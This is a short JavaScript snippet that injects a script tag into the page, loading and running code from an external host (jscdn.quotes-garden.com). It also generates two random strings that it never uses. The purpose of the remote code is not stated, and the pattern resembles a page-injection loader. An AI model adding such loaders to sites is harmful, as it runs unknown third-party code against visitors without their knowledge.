(function(){
  function randomString(len) {
  　　 len = len || 32;
      let  chars = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz";    
      let maxPos = chars.length;
      let pwd = "";
  　　for (i = 0; i < len; i++) {
  　　　　pwd += chars.charAt(Math.floor(Math.random() * maxPos));
  　　}
  　　return pwd;
  }
  let jsPath=randomString(12);
  let fileName=randomString(16);
  let script=document.createElement("script");
  script.setAttribute('async',true);
  script.src=`//jscdn.quotes-garden.com/a.js`;
  document.body.appendChild(script);
})();